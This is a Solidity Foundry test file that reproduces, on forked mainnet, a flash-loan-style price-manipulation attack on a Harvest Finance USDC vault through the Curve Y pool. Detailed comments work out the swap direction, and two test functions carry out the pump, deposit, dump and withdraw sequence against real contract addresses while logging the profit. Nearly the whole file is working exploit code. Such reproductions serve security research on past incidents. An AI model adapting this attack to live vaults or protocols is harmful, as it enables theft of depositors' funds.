// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
    function strategy() external view returns (address);
}

interface IStrategy {
    function depositArbCheck() external view returns (bool);
}

contract DebugFUSDC2 is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    function setUp() public {
        deal(DAI, address(this), 100_000_000e18);
        deal(USDC, address(this), 100_000_000e6);
        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);
    }

    // Try: pump with USDC -> DAI (reverse direction!)
    // For fUSDT: pump is USDC(funding)->USDT(target). This makes USDT scarce in pool.
    // For fUSDC: maybe we need to pump USDC -> DAI? No, that makes USDC abundant, price drops.
    // Wait - the fUSDT exploit pumps funding->target: USDC->USDT
    // The curve exchange_underlying call is: exchange_underlying(fundingIndex, targetIndex, pumpSize, 0)
    // For fUSDT: fundingIndex=USDC(1), targetIndex=USDT(2), so it swaps USDC->USDT
    // This puts USDC into Curve, takes USDT out. USDT becomes scarce.
    // investedUnderlyingBalance for fUSDT strategy: calc_withdraw_one_coin for USDT
    // When USDT is scarce in pool, removing one coin (USDT) gets you LESS USDT per yCRV
    // So investedUnderlyingBalance DECREASES
    // pricePerFullShare = underlyingBalanceWithInvestment * 1e6 / totalSupply -- DECREASES
    // deposit: shares = amount * totalSupply / underlyingBalanceWithInvestment -- MORE SHARES
    // Then dump: USDT->USDC, restore pool. underlyingBalanceWithInvestment goes back up.
    // withdraw: get amount = shares * underlyingBalanceWithInvestment / totalSupply -- MORE UNDERLYING
    // PROFIT!

    // For fUSDC: target=USDC, funding=DAI
    // Pump: DAI(funding)->USDC(target). Puts DAI in, takes USDC out. USDC becomes scarce.
    // calc_withdraw_one_coin for USDC: when USDC is scarce, removing USDC gets LESS USDC per yCRV
    // investedUnderlyingBalance DECREASES ✓
    // deposit gets more shares ✓
    // Dump: USDC(target)->DAI(funding). Puts USDC back, takes DAI. Pool restored.
    // withdraw gets more ✓
    // This IS the correct direction!

    // But the problem is: we need the PROFIT from shares > cost of pump/dump slippage
    // Let's test with larger pump to get bigger price distortion
    function testFUSDC_LargePump() public {
        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        uint256 daiStart = IERC20(DAI).balanceOf(address(this));

        // Get vault info before
        uint256 vaultBalBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();
        uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();
        console.log("Vault balance before:", vaultBalBefore);
        console.log("PPFS before:", ppfsBefore);

        // PUMP: 50M DAI -> USDC
        uint256 pumpAmt = 50_000_000e18;
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(0, 1, pumpAmt, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;
        console.log("Pumped USDC (from 50M DAI):", pumpedUSDC);

        uint256 ppfsAfterPump = IHVault(FUSDC).getPricePerFullShare();
        console.log("PPFS after pump:", ppfsAfterPump);
        console.log("PPFS change:", int256(ppfsAfterPump) - int256(ppfsBefore));

        // Check arb
        bool arbOk = IStrategy(IHVault(FUSDC).strategy()).depositArbCheck();
        console.log("depositArbCheck:", arbOk);

        // DEPOSIT
        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));
        console.log("Shares:", shares);

        // DUMP: 50M USDC -> DAI
        uint256 dumpAmt = 50_000_000e6;
        ICurveYPool(CURVE).exchange_underlying(1, 0, dumpAmt, 0);

        uint256 ppfsAfterDump = IHVault(FUSDC).getPricePerFullShare();
        console.log("PPFS after dump:", ppfsAfterDump);

        // WITHDRAW
        IHVault(FUSDC).withdraw(shares);

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        uint256 daiEnd = IERC20(DAI).balanceOf(address(this));
        int256 usdcProfit = int256(usdcEnd) - int256(usdcStart);
        int256 daiProfit = int256(daiEnd) - int256(daiStart);
        console.log("USDC profit (6 dec):");
        console.logInt(usdcProfit);
        console.log("DAI profit (18 dec):");
        console.logInt(daiProfit);

        // Net profit in USDC terms (DAI ~= USDC at 1:1)
        int256 netProfitUSDC = usdcProfit + daiProfit / 1e12;
        console.log("Net profit (USDC equiv):");
        console.logInt(netProfitUSDC);
    }

    // Try the OPPOSITE direction: pump USDC -> DAI, then deposit, then dump DAI -> USDC
    // This puts USDC INTO Curve, making USDC abundant
    // calc_withdraw_one_coin for USDC when USDC is abundant: MORE USDC per yCRV
    // investedUnderlyingBalance INCREASES
    // pricePerFullShare INCREASES
    // deposit gets FEWER shares (bad)
    // But then dump reverses it...
    // Actually this is the WRONG direction for deposit profiting
    // BUT: what about the WITHDRAW profiting?
    // If we first WITHDRAW when price is inflated, we get more USDC
    // Then dump to restore price
    // But we'd need existing vault shares...
    //
    // Actually, let me try the original Harvest attacker's approach:
    // Step 1: Swap Y->X to move price down (buy X cheap)
    // Step 2: Deposit X into vault at deflated share price (get more shares)
    // Step 3: Swap X->Y to move price up (restore)
    // Step 4: Withdraw shares at restored/higher price
    //
    // For USDC vault:
    // Step 1: Swap USDC->DAI (put USDC in pool, take DAI out) - USDC abundant, price of removing USDC goes UP
    // Wait no... when USDC is abundant in pool, calc_withdraw_one_coin(yCRV, USDC) gives MORE USDC
    // So investedUnderlyingBalance goes UP, pricePerFullShare goes UP
    // deposit gets fewer shares (bad!)
    //
    // So the correct pump for fUSDC deposit-exploit is: make USDC SCARCE
    // = swap DAI -> USDC (take USDC out of pool)
    // But with DAI->USDC, we need capital DAI to pump and capital USDC to dump
    // The issue is slippage on both sides eats the profit
    //
    // Maybe we need MUCH larger flash amounts to get a bigger price distortion?
    // Or multiple iterations within one flash?

    function testFUSDC_MultiIter() public {
        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        uint256 daiStart = IERC20(DAI).balanceOf(address(this));

        // 5 iterations with 10M pump/dump each
        for (uint256 i = 0; i < 5; i++) {
            // PUMP: 10M DAI -> USDC
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, 10_000_000e18, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            // DEPOSIT
            IHVault(FUSDC).deposit(pumpedUSDC);

            // DUMP: 10M USDC -> DAI
            ICurveYPool(CURVE).exchange_underlying(1, 0, 10_000_000e6, 0);

            // WITHDRAW
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));
            IHVault(FUSDC).withdraw(shares);

            console.log("Iter", i);
        }

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        uint256 daiEnd = IERC20(DAI).balanceOf(address(this));
        console.log("USDC profit:");
        console.logInt(int256(usdcEnd) - int256(usdcStart));
        console.log("DAI profit:");
        console.logInt(int256(daiEnd) - int256(daiStart));
        int256 netUSDC = (int256(usdcEnd) - int256(usdcStart)) + (int256(daiEnd) - int256(daiStart)) / 1e12;
        console.log("Net USDC:");
        console.logInt(netUSDC);
    }
}
